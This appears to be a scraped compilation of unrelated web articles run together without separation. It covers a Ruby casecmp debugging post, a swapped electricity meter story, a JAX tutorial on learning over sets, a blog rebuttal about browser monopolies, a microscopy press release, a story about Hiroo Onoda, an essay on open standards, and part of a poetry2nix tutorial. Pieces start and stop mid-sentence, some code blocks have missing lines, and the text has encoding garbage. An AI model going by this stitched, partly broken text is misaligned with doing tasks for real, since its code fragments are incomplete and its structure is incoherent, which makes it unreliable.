<p>Letâ€™s look at the loop we presented above in Ruby 2.7.0, but <a href="https://github.com/ruby/ruby/blob/a9a48e6a741f048766a2a287592098c4f6c7b7c7/string.c#L3413-L3414">in Ruby 2.6.6</a> this time:</p>

  <span>p1</span><span>++</span><span>;</span>
  <span>p2</span><span>++</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Notice that instead of using <code>TOLOWER</code> as in Ruby 2.7.0, Ruby 2.6.6 uses <code>TOUPPER</code>. Interesting.</p>

<p>Letâ€™s fast-forward to the part where we get to <code>c1</code> and <code>c2</code> for the second character in the input:</p>

<div><div><pre><code>3414			unsigned int c2 = TOUPPER(*p2 &amp; 0xff);
(gdb) next
3415	                if (c1 != c2)
(gdb) print c1
$5 = 85
(gdb) print c2
$6 = 96
</code></pre></div></div>

<p>Hereâ€™s a visual representation of the buffers:</p>

<div><div><pre><code>     c1
     â†“
108  85  ?   ?
 L   U   C   K

108  96  ?   ?   ?   ?   ?   ?   ?
 L   `   A   U   G   U   S   T   E
     â†‘
     c2
</code></pre></div></div>

<p><code>c1</code> is <code>85</code>, which is the character code for <code>U</code>, and <code>c2</code> is <code>96</code> (just like in Ruby 2.7.0), which is the character code for a backtick (<code>`</code>).</p>

<p>This time though, the comparison result is different, because <code>c1 &lt; c2</code> (<code>85 &lt; 96</code>), so <code>str_casecmp</code> returns <code>-1</code>.</p>

<p>There it is: because Ruby 2.6 uses <code>TOUPPER</code> and Ruby 2.7 uses <code>TOLOWER</code> before comparing the inputs, and because one of the characters to compare is a backtick (<code>`</code>, which canâ€™t be converted to uppercase or lowercase in any way), the other characterâ€™s code â€œmovesâ€� differently around the â€œfixedâ€� backtick character code, affecting the result of the <code>String#casecmp</code> function.</p>

<hr>

<p>To summarize, the root cause of the issue is that <code>String#casecmp</code> was updated in Ruby 2.7 to <strong>lowercase</strong> the two inputs before comparing them, while Ruby 2.6 used to <strong>uppercase</strong> the two inputs before comparing them. <a href="https://github.com/ruby/ruby/commit/082424ef58116db9663a754157d6c441d60fd101#diff-7a2f2c7dfe0bf61d38272aeaf68ac768">This is the commit where this change was introduced.</a></p>

  <article>
    <p>I’ve lived in my house for just under two years. Last summer, I noticed something strange. Our electricity bill increased by 40-90% depending on the month. This year, I finally tracked it down and discovered our meter was being mixed up with our neighbor’s. Here’s how I tracked this down and what you can do to prevent it from happening to you.</p>



<p>I have an amateur interest in electricity, conserving energy, and energy efficiency in general. I care about my carbon footprint, as well as my bill, and I’m passionate about innovation in this space. I’ve made it a habit to have a good idea of how much electricity different appliances use and, in general, I try to be aware of where my electricity is going. Years ago, I bought a simple <a href="https://en.wikipedia.org/wiki/Kill_A_Watt">Kill A Watt</a> to quickly get an idea of how much power things use.</p>



<p>The first time I noticed a problem was when we got our July bill in the summer of 2019. It was about 40% higher than usual. My grandparents stayed with us (in their motorhome) for a week that month, and their motorhome has a big air conditioner, so I chalked it up to that, though that still seemed high.</p>

<p>A couple months passed and the problem got worse. It went from 40% higher than normal, to a peak of about 90%. I couldn’t explain that. We don’t have central air conditioning. Most of our heavy appliances use natural gas. We did use a portable air conditioner briefly, but never for more than a couple hours a night. I also measured the power usage of the A/C and thought, there’s no way this adds up. This confusion continued until we got our October bill and it returned to normal, and I forgot about it for another year.</p>



<p>And…it came back! I first noticed this year in June when the bill jumped about 20%. I figure it’s reasonable for the bill to fluctuate a little, but not by that much. Plus, what made even less sense is that we used supplemental electric heating this winter, so if anything, our bill should’ve been higher in the winter! Again, no central air conditioning, so another unexplained bill. I tracked power usage on everything I could think of, to make sure I hadn’t missed something. For awhile, my big suspect was our fridge. It’s 18 years old, so I figured, maybe there’s a problem with it and it uses more power when it should, especially when the ambient temperature is higher. I cleaned the coils and played around with the fridge settings, then waited for our next bill. It got worse.</p>

<p>This year, I noticed our power company has a cool interface online where you can see your daily power usage. Very handy. I noticed that, in non-summer months, it was very consistent, ranging between 9-12 kWh per day. Then, in the summer months, it just goes all over the place. Sometimes it was 8, other days it went as high as 24! This seemed loosely correlated with the temperature but I just couldn’t explain that, due to a lack of central cooling in our house. I finally decided to call the power company at this point. Naturally, they did not take me too seriously, and were fairly insistent that it was my air conditioning (that I didn’t have). I was told to hire an electrician to investigate.</p>

<p>Then it got weirder. In late July, I noticed that in recent weeks, our daily power usage (according to the power company) dipped as low as 1 kWh per day! That’s just not possible, I thought. My electronics, combined, should use more than that per day, not even counting heavier users like the fridge. The power usage still fluctuated quite a bit, but there were several days where the power usage was as low as 1-3 kWh. I called the power company again and, no surprise, they took this much more seriously and agreed that wasn’t possible. I insisted that the peaks in usage didn’t make sense either, that I couldn’t explain those, but no luck there…they were really only interested in the low days and said they were opening an investigation that could take “at least a few weeks” to finish.</p>



<p>One night, I finally put it together. I wondered if my bill was mixed up with my neighbor’s. My neighbor had moved out in July, and that’s about when the daily power usage fell to almost nothing. I also happened to know that they have central air conditioning. I looked at my bill and noticed it actually has the meter number on it, very helpful! I looked at my meter and the number on the bill wasn’t even remotely close. It wasn’t off-by-one. The format looked consistent, but the values looked randomized. I was wondering whether I was even looking at the right number. So, the next morning, I took a look at my neighbor’s (vacant) house’s meter. Sure enough, it exactly matched what was on my bill.</p>

<p>A few frustrating phone calls later (not important), and the issue is fixed. We got the charges corrected and are enjoying a large credit on our account that ought to last us about 6 months (after having lived here only 2 years).</p>

<p>In any future house I live in, I will be sure to check that my bill’s meter number matches what’s on the property. I highly recommend everyone do the same, because I get the impression this is fairly common. A quick search online and I found about half a dozen news articles about this happening, often more egregious cases than my own. Most of us may not notice a mixup, either because the usage is fairly consistent or we just don’t know how much power we use. Thankfully, you should be able to check the accuracy of your bill in about 5 minutes if your meter is easily accessible. Simply look for the meter number on your bill (hopefully all power companies give this info), and then look physically at the meter for a sticker from your power company, and see if the numbers match.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>In machine learning, we typically work with input pairs (x, y), and we try to figure out how x and y depend on each other.
To do so, we gather many such pairs and hope that the dependence will reveal itself if a) we have enough data, b) our model is expressive enough to approximate this dependency, and c) we get the hyperparameters right.
In the simplest case, both x and y are just scalar values (or vectors \(\mathbf{x}, \mathbf{y}\)); for example, given some measurements of a plant’s shape, we might want to predict its species. The measurements here are real vectors \(\mathbf{x} \in \mathcal{X}\), where the input space \(\mathcal{X} = \mathbb{R}^d\) is usually Euclidean, and the species is a label \(\mathbf{y} \in \mathcal{Y}\) (usually an integer or a one-hot vector), but it is common for \(\mathbf{x}\) and \(\mathbf{y}\) to have more structure.</p>

<p>One of the main assumptions we rely on is that the pairs of (x, y) points are <a href="https://en.wikipedia.org/wiki/Independent_and_identically_distributed_random_variables">independent and identically distributed (i.i.d.) random variables</a>.
Let us unpack this a bit, starting from the end,</p>

<ul>
  <li><code>random variable</code>: there exists some stochastic generative process from which the variables were randomly sampled,</li>
  <li><code>identically</code>: all samples come from the same probability distribution,</li>
  <li><code>independent</code>: the generative process has no memory of generated samples, and hence any generated sample does not change the distribution over future generated samples.</li>
</ul>

<p>Any structure in \(\mathbf{x}, \mathbf{y}\), or both introduces constraints, and a successful application of an algorithm to a particular problem does heavily depend on whether or not this algorithm takes the relevant constraints into account.
A common constraint in image-related problems is translation equivariance<sup id="fnref:cnnequiv" role="doc-noteref"><a href="#fn:cnnequiv">1</a></sup>—the output of the algorithm should shift with any shifts applied to the image (you can read more about equvariances in <a href="https://fabianfuchsml.github.io/equivariance1of2/">this excellent blog post</a>).
In natural language-related problems, a typical constraint is causality: a token at position t can depend on any previous tokens at position 1:t-1, but it cannot depend on any future tokens<sup id="fnref:languecausality" role="doc-noteref"><a href="#fn:languecausality">2</a></sup>.</p>

<p>In the above examples, the dependencies between points (e.g., autoregressive dependence in NLP) are clear from the context.
However, if a data point is not a vector, matrix, or a sequence of vectors, but it is a <strong>set of vectors</strong>, these dependencies become less clear.
In particular, elements in an input set resemble elements in a dataset (i.e., lack of order), but the critical difference is that they are <strong>not independent</strong>, therefore breaking the i.i.d. assumption.
Accounting for this specific structure in inputs or outputs of an ML model leads to a family of set learning problems, which have recently gained considerable attention in the machine learning community.
I thought it would be useful to delve into the machine learning of sets.
In the following, we will consider set-to-vector, vector-to-set, and set-to-set problems and provide implementations of simple algorithms in <a href="https://github.com/google/jax">JAX</a> and <a href="https://github.com/deepmind/dm-haiku">haiku</a>.</p>

<p>First some imports:</p>

<div><div><pre><code>import jax
import jax.numpy as jnp
import haiku as hk
</code></pre></div></div>


<p>Before we start, it is useful to introduce some notation.
Let \(\mathbf{x} \in \mathbb{R}^d\) be an input vector, \(\mathbf{y} \in \mathbb{R}^k\) the output vector, and let \(X = \{\mathbf{x}_i\}_{i=1}^M\) and \(Y = \{\mathbf{y}_j\}_{j=1}^N\) be sets of \(M\) and \(N\) elements, respectively.
Note that, until now, \(y\) or \(\mathbf{y}\) were simply labels.
From now on, however, \(\mathbf{x}\) and \(\mathbf{y}\) can live in the same space, and simply be elements of different sets.
I will also use \(\mathcal{L}(X, Y)\) as a loss function operating on two sets, and \(l(\mathbf{x}, \mathbf{y})\) will be a loss function for pairs of elements.</p>


<p>This is perhaps the simplest set-learning problem since it only requires permutation invariance.
A function \(f\) is invariant to permutations \(\pi\) if \(\forall \pi\): \(f(X) = f(\pi X)\).
Permutation invariance has always been known in machine learning, as loss functions we use almost never<sup id="fnref:acn" role="doc-noteref"><a href="#fn:acn">3</a></sup> depend on the ordering of elements in our datasets or minibatches.
This is not for the lack of order: to create a minibatch, we stack multiple data elements in an array; this pairs every element in the minibatch with its minibatch index, therefore implicitly creating an order.
Loss functions tend to discard information about the order, usually by taking the mean over data examples.
We can create permutation-invariant functions by following a similar logic.</p>

<p>Examples in a minibatch are processed independently (which reflects their i.i.d. nature), but if each entry in the minibatch contains more than just a single data point (many pixels in an image, points in a point cloud, tokens in a language sentence), then flattening these points into a vector and feeding it into an MLP or a CNN results in different parameters being used for processing different data points, and hence order is used implicitly; feeding the points into an RNN reuses parameters, but introduces an explicit dependence on the order.</p>

<p>A straightforward solution to this issue is to treat points in a single example in the same way we treat examples in the minibatch: treat them independently.
This approach, followed by a permutation-invariant pooling operation such as max or mean pooling, is explored in <a href="https://arxiv.org/abs/1703.06114">Zaheer et al., “Deep Sets”, NeurIPS 2017</a> and is proven to be a universal set-function approximator<sup id="fnref:deepsetdim" role="doc-noteref"><a href="#fn:deepsetdim">4</a></sup>.</p>

<div><div><pre><code>class DeepSet(hk.Module):

  def __init__(self, encoder, decoder):
    super().__init__()
    self._encoder = encoder
    self._decoder = decoder
    
  def __call__(self, x):
    """Compute the DeepSet embedding.

    Args:
      x: Tensor of shape [batch_size, n_elems, n_dim].
    """
    return self._decoder(self._encoder(x).mean(1))
</code></pre></div></div>

<p>While newer approaches with better empirical performance exist, they all draw from the Deep Sets framework<sup id="fnref:setembeddings" role="doc-noteref"><a href="#fn:setembeddings">5</a></sup>.
Another factor contributing to the fact that the set-to-vector problem is quite easy is that pooling operations naturally work with variable-sized sets–there is nothing extra we have to do to handle sets of variable cardinality.
This is not the case in the following two problems, where we have to take the set size into account explicitly.</p>


<p>In vector-to-set, the task is to generate a set of real vectors from some (usually vector-valued) conditioning.</p>

<p>The majority of approaches out there focus on generating ordered sequences instead of unordered sets, and usually of fixed or at least known size.
This allows using MLPs<sup id="fnref:setae" role="doc-noteref"><a href="#fn:setae">6</a></sup> and RNNs<sup id="fnref:order_matters" role="doc-noteref"><a href="#fn:order_matters">7</a></sup> to predict fixed- and variable-length sets, respectively, but at the price of having to learn permutation-equivariance from data.
Learning permutation-equivariance can be induced by data augmentation. It is easy to generate different permutations, but usually comes at a decreased performance and/or longer training times compared to truly permutation-equivariant methods<sup id="fnref:data_augmentation" role="doc-noteref"><a href="#fn:data_augmentation">8</a></sup>.</p>

<div><div><pre><code>  def set_mlp(conditioning, decoder, n_elements):
    """Predicts a set.

    Args:
      conditioning: tensor of shape [batch_size, n_dim].
      decoder: callable, e.g. an MLP.
      n_elements: int.
    """
    z = decoder(conditioning)
    batch_size = conditioning.shape[0]
    # all we can do here is reshape!
    return z.reshape(batch_size, n_elements, -1)

  def set_rnn(conditioning, state, rnn, n_elements):
    """Predicts a set.

    Args:

      z, state = rnn(conditioning, state)

    return jnp.concatenate(zs, 1)
</code></pre></div></div>

<h4 id="permutation-invariant-loss-functions">Permutation-Invariant Loss Functions</h4>
<p>Learning to generate sets based on some conditioning typically requires scoring that set against the conditioning.
If we have ground-truth sets at our disposal, we can compare the generated sets against the ground-truth ones for the same conditioning.
This can take the form of supervised learning (think of detecting objects in an image, where we need to generate a set of bounding boxes) or unsupervised learning (autoencoding point-clouds, say).
Since we generally have no guarantee that the generated sets will obey any ordering (why should they?), we have to apply losses invariant to that ordering.
We have two options here:</p>

<ul>
  <li>We can find an optimal matching between two sets<sup id="fnref:bipartite_matching" role="doc-noteref"><a href="#fn:bipartite_matching">9</a></sup>, which comes down to finding a permutation \(\pi\) of one of the sets that minimizes the computed loss, that is: \(\pi^\star = \arg \min_\pi \mathcal{L}( \pi X, Y)\), with \(\mathcal{L}( \pi X, Y) = \sum_i l(\mathbf{x}_{\pi(i)}, \mathbf{y}_i)\). This can be done exactly using the cubic <a href="https://en.wikipedia.org/wiki/Hungarian_algorithm">Hungarian matching</a> algorithm, or approximately using e.g. <a href="https://arxiv.org/abs/1106.1925">optimal-transport</a>- or <a href="https://web.stanford.edu/~bayati/papers/bpmwmIT.pdf">message-passing</a>-based algorithms.</li>
  <li>Instead of finding a matching, we can find a lower bound on what the matched loss would be. A popular choice here is the Chamfer loss<sup id="fnref:chamfer" role="doc-noteref"><a href="#fn:chamfer">10</a></sup>, which computes \(\sum_{x \in X} \min_{y \in Y} l(x, y) + \sum_{y \in Y} \min_{x \in X} l(x, y)\). For every element in one set, it finds the element in the other set that results in the lowest pairwise loss. This loss does not work for multisets as elements can be repeated.</li>
</ul>

<p>If we do not have ground-truth for each conditioning (we have just sets), or if we have many possible sets for each conditioning (e.g., a group of possible sets for one of a few labels), we can instead learn by matching distributions e.g., in the GAN setting.
If we take this approach, we have two problems, really: that of vector-to-set for the generator and set-to-vector for the discriminator. 
Fortunately, we know how to solve the set-to-vector problem with a permutation-invariant neural net, and shortly I am going to describe some permutation-equivariant methods for generation.
This is precisely what we recently explored in <a href="https://oolworkshop.github.io/program/ool_32.html">Stelzner et al., “Generative Adversarial Set Transformers”, ICML 2020 Object-Oriented Learning Workshop</a>.</p>

<p>Coincidentally, sometimes we have to deal with a set of latent variables inside a model. For example in …</p></div></div>

  <p>So I read <a href="https://drewdevault.com/2020/08/13/Web-browsers-need-to-stop.html">this blog post</a>, and it’s bothering me.
It’s pretty short, so I recommend you read it before continuing with this post.</p>
<p>Done? Alright.</p>

<p><img src="https://www.blackcap.site/img/divider.svg" width="300">
</p>
<p>I think that article expresses a generally good opinion in the worst way possible.</p>
<p>It’s true that if Chrome becomes the only browser on the market, it’d lead to a very unhealthy monopoly situation.
There’s an analogy to be drawn with Microsoft’s <a href="https://en.wikipedia.org/wiki/Embrace,_extend,_and_extinguish">EEE strategy</a>, except that instead of extending open software with proprietary APIs, Google is extending it with <em>so many</em> APIs that no one can ever build anything compatible.</p>
<p>For the web to remain an open and innovative platform, there need to be multiple competing browser engines.
The more features Google adds to Chrome, the harder it becomes for Firefox to keep up, and the more impossible it becomes for anyone to build a new browser from scratch.</p>
<p>But this article seems almost allergic to actual solutions.
It is intent on blaming all the wrong people without proposing any real answers.</p>
<p>Look at this bit:</p>
<blockquote>
<p>Mozilla just fired everyone relevant to focus on crap no one asked for like Pocket, and fad nonsense like a paid VPN service and virtual reality tech.</p>
</blockquote>
<p>Of course they did – they had no choice.
It takes money to build software.
Pocket, even if it is “crap no one asked for,” is an opportunity to serve ads.
“Fad nonsense” like paid VPNs actually make quite a bit of money these days.
Mozilla makes Firefox, Servo, MDN, and Rust, and does it all for free.
I love Mozilla for it, but this article seems to believe that all that is needed for this state of affairs to continue is… what, exactly?</p>
<blockquote>
<p>No layoffs or pay cuts at the management level, of course!
It’s not like they’re responsible for these problems, it’s not like anyone’s fucking responsible for any of this, it’s not like the very idea of personal responsibility has been forgotten by both executives and engineers, no sir!</p>
</blockquote>
<p>“Personal responsibility,” apparently.
I totally support pay cuts for executives, but you can’t save 250 jobs like that, and “personal responsibility” alone can’t pay the bills.
Not only does appealing to personal responsibility solve nothing, it distracts us from actual solutions by letting us blame individuals for the systemic reasons that our problems exist in the first place.</p>
<p>If we want to protect the public good by keeping Mozilla in the black, we need to stop expecting them to do their work for free while still making money in the market.
We need to provide them with government grants.
Clearly charitable donations aren’t enough – let’s fund important software the same way we fund important science: with public money.</p>
<p>As for the question of scope creep in browsers, how do we solve that?
Google seems content to just keep adding features, even if that’s ultimately bad for the ecosystem.
This applies to AMP too.
Google bumps AMP websites to the top of its search results regardless of speed.
This is anti-competitive behaviour.
How does this article propose we stop this?</p>
<blockquote>
<p>No one wants AMP.
Google knows it, you know it, I know it.
If you’re a Google engineer who is still working on AMP, you are a disgrace to your field.
Take responsibility for the code you write.
This project needs to be dead and buried and the earth above salted, and it needs to happen yesterday.</p>
</blockquote>
<p>“Personal responsibility,” again.
Let’s just <em>ask</em> all the engineers at Google to stop making AMP.
That’s not a solution; we can’t solve problems just by asking everyone to stop doing the thing.
What’s next, are we gonna fix global warming by asking everyone working in the fossil fuel sector to quit?
Are we gonna end sweatshop labour by asking every Nike employee to resign?
At no point in history has social change ever worked this way.
This is a non-solution.</p>
<p>If we think AMP is anti-competitive, the answer is anti-trust legislation.
Plain and simple.
If we want to decouple Chrome from Google’s private interests, the only way to actually do that is to break up Google, separating the Chrome team into its own non-profit org.</p>
<p>Are these good proposals?
Maybe.
I like them.
They’re worth discussing, at least.
But they’re better than “enough is enough,” because that’s nothing at all.
And they’re infinitely better than this weird “personal responsibility” thing, because that’s the <em>opposite</em> of a solution:
It’s something that feels like a solution – something we can waste our time talking about for ages – but something which will never actually solve the problem.</p>
<blockquote>
<p>I call for an immediate and indefinite suspension of the addition of new developer-facing APIs to web browsers.</p>
</blockquote>
<p>Google does not care what you think.
If you want to change their behaviour, you can’t just ask them to do something else.
You have to change the system of incentives and barriers which Google operates within, and force them to act differently.
By ignoring the political instruments and market forces which Google responds to in favour of shaming individuals into “taking personal responsibility,” you achieve nothing.</p>

<p><img src="https://www.blackcap.site/img/divider.svg" width="300">
</p>
<p>Having written all of this, I feel like I may be being too harsh.
This article never claimed to have solutions – in fact, it’s only a few paragraphs long.
I’ve more than quadrupled its word count in this response.
But if all we do is complain about problems, and then complain about how no one’s “taking responsibility,” we never actually fix anything.
This article blames individuals instead of systems.
It is concerned entirely with symptoms instead of looking for the root cause.</p>
<p>This is a type of thought which I find particularly frustrating, because it points fingers but doesn’t solve problems.
We will never stop corporate monopoly power by exercising our “personal responsibility.”
Shouting “Google, please stop!” into the void does nothing at all.
They will never stop of their own volition.
Ask voters to stop them instead.</p>

But to achieve high resolution over a large specimen area, the energy of the electron beams needs to be cranked up, which is costly and detrimental to the specimen under observation. </p><p>Texas A&amp;M University researchers may have found a new method to improve the quality of low-resolution electron micrographs without compromising the integrity of specimen samples. By training deep neural networks, a type of artificial intelligence algorithm, on pairs of images from the same sample but at different physical resolutions, they have found that details in lower-resolution images can be enhanced further. </p><p>“Normally, a high-energy electron beam is passed through the sample at locations where greater image resolution is desired. But with our image processing techniques, we can super resolve an entire image by using just a few smaller-sized, high-resolution images,” said Dr. Yu Ding, Mike and Sugar Barnes Professor in the Wm Michael Barnes ‘64 Department of Industrial and Systems Engineering. “This method is less destructive since most parts of the specimen sample needn’t be scanned with high-energy electron beams.”</p><p>The researchers published their image processing technique in <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fieeexplore.ieee.org%2Fabstract%2Fdocument%2F9117049&amp;t=MTM5ODIwMTE1NmFmMzcyMDlkNDU3ODA2YzNiYTdjZGU1NTc1MDc3MCw4RmVldkVyRQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F626385139089424384%2Fhi-res-microscope-no-zoom-in&amp;m=0&amp;ts=1597594870"><i> Institute of Electric and Electronics Engineers’ Transactions on Image Processing</i></a> in June. </p><p>Unlike in light microscopy where photons, or tiny packets of light, are used to illuminate an object, in electron microscopy, a beam of electrons is utilized. The electrons reflected from or passing through the object are then collected to form an image, called the electron micrograph. </p><p>Thus, the energy of the electron beams plays a crucial role in determining the resolution of images. That is, the higher the energy electrons, the better the resolution. However, the risk of damaging the specimen also increases, similar to how ultraviolet rays, which are the more energetic relatives of visible light, can damage sensitive materials like the skin. </p><p>“There’s always that dilemma for scientists,” said Ding. “To maintain the specimen’s integrity, high-energy electron beams are used sparingly. But if one does not use energetic beams, high-resolution or the ability to see at finer scales becomes limited.”</p><p>But there are ways to get high resolution or super resolution using low-resolution images. One method involves using multiple low-resolution images of essentially the same region. Another method learns common patterns between small image patches and uses unrelated high-resolution images to enhance existing low-resolution images.</p><p>These methods almost exclusively use natural light images instead of electron micrographs. Hence, they run into problems for super-resolving electron micrographs since the underlying physics for light and electron microscopy is different, Ding explained.</p><p>The researchers turned to pairs of low- and high-resolution electron microscopic images for a given sample. Although these types of pairs are not very common in public image databases, they are relatively common in materials science research and medical imaging.</p><p>For their experiments, Ding and his team first took a low-resolution image of a specimen and then subjected roughly 25% of the area under observation to high-energy electron beams to get a high-resolution image. The researchers noted that the information in the high-resolution and low-resolution image pair are very tightly correlated. They said that this property can be leveraged even though the available dataset might be small.</p><p>For their analyses, Ding and his team used 22 pairs of images of materials infused with nanoparticles. They then divided the high-resolution image and its equivalent area in the low-resolution image into three by three subimages. Next, each subimage pair was used to “self-train” deep neural networks. Post-training, their algorithm became familiar at recognizing image features, such as edges. &nbsp;</p><p>When they tested the trained deep neural network on a new location on the low-resolution image for which there was no high-resolution counterpart, they found that their algorithm could enhance features that were hard to discern by up to 50%.</p><p>Although their image processing technique shows a lot of promise, Ding noted that it still requires a lot of computational power. In the near future, his team will be directing their efforts in developing algorithms that are much faster and can be supported by lesser computing hardware.</p><p>“Our paired image processing technique reveals details in low-resolution images that were not discernable before,” said Ding. “We are all familiar with the magic wand feature on our smartphones. It makes the image clearer. What we aim to do in the long run is to provide the research community a similar convenient tool for enhancing electron micrographs.”</p><p>–</p><p><i>Header image:&nbsp;Left and right images show false-colored electron microscopic images of the same region on the specimen. But the image on the right has been super-resolved using Dr. Ding’s new image processing method.

<h3>
The story of Hiroo Onoda and Norio Suzuki .
</h3>
<div>
<div id="post-body-5431664009188123112">
<div dir="ltr" trbidi="on"><p>
Well the story begins with <b>Hiroo Onodo</b>.</p><div>
<p>
A Japanese&nbsp; Army Intelligence officer who fought in world war II.&nbsp;</p>
<p>
On 23 December 1944 he was sent to Lubang Island&nbsp; in the Philippines with orders which stated that under no conditions he should surrender or take his own life.</p>
<p>
But after few months The United States detonated two nuclear weapons over the Japanese cities of Hiroshima and Nagasaki on August 6 and 9, 1945 which&nbsp; ended the World War II as Japanese surrenders.The Philippines forces distributed leaflet announcing that Japan has surrender in Oct 1945,However he and his companion distrusted the leaflet thinking that it was a allied propaganda.As they continue to carry out guerrilla&nbsp; activities and shootouts with the forces .In 1952 letters and family pictures were dropped from aircraft&nbsp; urging them to surrender,but they concluded that it was a trick. In 1972 his companion Kozuka was killed by local police. Onoda was now alone. After 2 years&nbsp; On Feb 20,1974 , Onoda met a Japanese man Norio Suzuki and then after orders from his senior was relived from his duty after 30 years.He was then a popular person in Japan.</p>
<p>
(He also released an autobiography, No Surrender: My Thirty-Year War, shortly after his return, detailing his life as a guerrilla fighter in a war that was long over)</p>
<p><b>Norio Suzuki?</b></p>
<p>
He&nbsp;was a Japanese explorer and adventurer. He studied economics but then dropped out and decided to explore the world. Four year he wander Asia, Africa&nbsp; and Middle east and then returned to Japan in 1972. As in 1972&nbsp; Japanese Media reported Kozuka was killed and his body then was surrender to Japan and after that there where many search efforts to find&nbsp; Hiroo Onodo which ended in a failure.</p>
<p>
Norio Suzuki then decided to search for the officer.</p>
<p>
He expressed his decision in this way: He wanted to search for "Lieutenant Onoda, a panda, and the Abominable Snowman(Yeti), in that order".This was kind of crazy life goals of&nbsp; Norio Suzuki .</p>
<p>
Suzuki found Onoda after four days of searching and later they both become friends.</p>
<p>
After finding Onoda, Suzuki quickly found a wild panda, and claimed to have spotted a yeti from a distance by July 1975, hiking in the Dhaulagiri range of the Himalayas. He married in 1976 but did not give up his quest.</p>
<p>
Suzuki died in November 1986 in an avalanche while searching for the yeti. His remains were discovered a year later and returned to his family.</p>
<div><p>
Hope you like the story of these two devoted people.<br>
There were people earlier having such dedication towards there goals nowadays we hardly find such thing. It is always good to have a goal set in your mind may it be anything but you must work on it everyday. It will always pay you back with high intensity.</p><p>

<p>2020-08-13

If you want to create a truly open standard, you _need_ to make it simple.

There are no exceptions to this rule. When a standard becomes harder to fully implement than what your average motivated programmer can do in two months (max!), it _shouldn't_ be considered "open" anymore.

Why?

</p>
<h2>Complicated Standards Lead to Implementation Monopolies</h2>
<p>Since implementing a complex standard is hard, you will eventually end up with the implementation that started the earliest and maintained since, being the only implementation that is actually usable. And that implementation will most likely be the one created by the standard's creators.

In cases where the standard's creators don't maintain an implementation like "the web"⁰, the only choices are either the standard dying out because of it's complexity, or the actively maintained implementations requiring tons of effort, with (most likely) companies backing said implementations.

</p>
<h2>Implementation Monopolies Lead to Extensions</h2>
<p>If a big implementation just decides one day that your standard is lacking, they can just extend the parts they want. The two outcomes of this being that:

</p>
<ul><li>The other implementations copy their extensions</li>
<li>That one implementation getting more users, and eventually, a near monopoly because of a bigger feature set</li></ul>
<p>
At that point, the "standard" implemented by said implementations is longer the actual defined standard, but because people will inevitably use the said extensions, any new implementation that wants to be considered usable will eventually need to support said proprietary extensions.

</p>
<h2>Too Many Extensions Spoil The Standard</h2>
<p>Even if you have an "open" extension system, where implementations can all propose and agree on extensions to the standard, you need to be able to keep those implementations in check, so their extensions don't overcomplicate the standard.

Remember: Having a simple standard with a million extensions is no better than a complex standard with no extensions.

</p>
<h2>Examples</h2>
<p>Please note that I will be skipping the elephant in the room: "the web", as it has been discussed _to death_.

</p>
<h3>Matrix</h3>
<p>Matrix is _technically_ an open standard. But because of the complexity it has accumulated over the years, Synapse is the only usable server implementation. Even Dendrite, the new implementation by *the same folk that created the standard*, is barely usable after _years_.

The same applies to Matrix clients, with Element being the only usable client implementation. That space definitely seems healthier than the server space, but the same issues are there.

</p>
<h3>Various Programming Languages</h3>
<p>I will not be specifying any language, as I might get any specifics incorrect, but a general pattern I have seen is that most programming languages have only a few compiler/interpreter implementations, even though the language is standardized in some form.

This example actually has some interesting reasoning behind this issue on top of the complicated standards:

</p>
<ul><li>Writing a compiler/interpreter can be hard.</li>
<li>Especially if the current implementations do optimizations or other "clever" tricks.</li></ul>
<p>
These issues can devolve into arguments regarding seeing the complexity of these issues as a part of the standard, and other "technology is too complicated in general" arguments, which I will not dive into here.

</p>
<h3>X Display Server</h3>
<p>The X Display Server standard got so complicated, the people developing it decided to abandon it entirely and create Wayland.

It probably didn't help that most of the standard was no longer being used, and a lot of extensions are required for its use today.

Wayland probably will also suffer the "too many extensions" problem at some point, so I am looking forward to that too...

</p>
<h2>Footnotes</h2>
<p>0: Well, Google, Mozilla and Apple all had a hand in most of the "modern" parts of the standards...

August 13, 2020 | https://www.tweag.io/blog/2020-08-12-poetry2nix/ | <a href="https://web.archive.org/web/*/https://www.tweag.io/blog/2020-08-12-poetry2nix/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><div><p>Most Python projects are in fact <em>polyglot</em>.
Indeed, many popular libraries on <a href="https://pypi.org/">PyPi</a> are Python wrappers around C code.
This applies particularly to popular scientific computing packages, such as <code>scipy</code> and <code>numpy</code>.
Normally, this is the terrain where Nix shines, but its support for Python projects has often been labor-intensive, requiring lots of manual fiddling and fine-tuning.
One of the reasons for this is that most Python package management tools do not give enough static information about the project, not offering the determinism needed by Nix.</p>
<p>Thanks to <a href="https://python-poetry.org/">Poetry</a>, this is a problem of the past — its rich lock file offers more than enough information to get Nix running, with minimal manual intervention.
In this post, I will show how to use Poetry, together with <a href="https://github.com/nix-community/poetry2nix">Poetry2nix</a>, to easily manage Python projects with Nix.
I will show how to package a simple Python application both using the existing support for Python in Nixpkgs, and then using Poetry2nix.
This will both show why Poetry2nix is more convenient, and serve as a short tutorial covering its features.</p>
<h2>Our application</h2>
<p>We are going to package a simple application, a <a href="https://flask.palletsprojects.com/">Flask</a> server with two endpoints: one returning a static string “Hello World” and another returning a resized image.
This application was chosen because:</p>
<ol>
<li>It can fit into a single file for the purposes of this post.</li>
<li>Image resizing using Pillow requires the use of native libraries, which is something of a strength of Nix.</li>
</ol>
<p>The code for it is in the <code>imgapp/__init__.py</code> file:</p>
<div data-language="python"><pre><code><span>from</span> flask <span>import</span> send_file
<span>from</span> flask <span>import</span> Flask

    main<span>(</span><span>)</span></code></pre></div>
<h2>The status quo for packaging Python with Nix</h2>
<p>There are two standard techniques for integrating Python projects with Nix.</p>
<h3>Nix only</h3>
<p>The first technique uses only Nix for package management, and is described in the <a href="https://nixos.org/nixpkgs/manual/#python">Python section</a> of the Nix manual.
While it works and may look very appealing on the surface, it uses Nix for all package management needs, which comes with some drawbacks:</p>
<ol>
<li>We are essentially tied to whatever package version Nixpkgs provides for any given dependency.
This can be worked around with overrides, but those can cause version incompatibilities.
This happens often in complex Python projects, such as data science ones, which tend to be very sensitive to version changes.</li>
<li>We are tied to using packages already in Nixpkgs.
While Nixpkgs has many Python packages already packaged up (around 3000 right now) there are many packages missing — PyPi, the Python Package Index has more than 200000 packages.
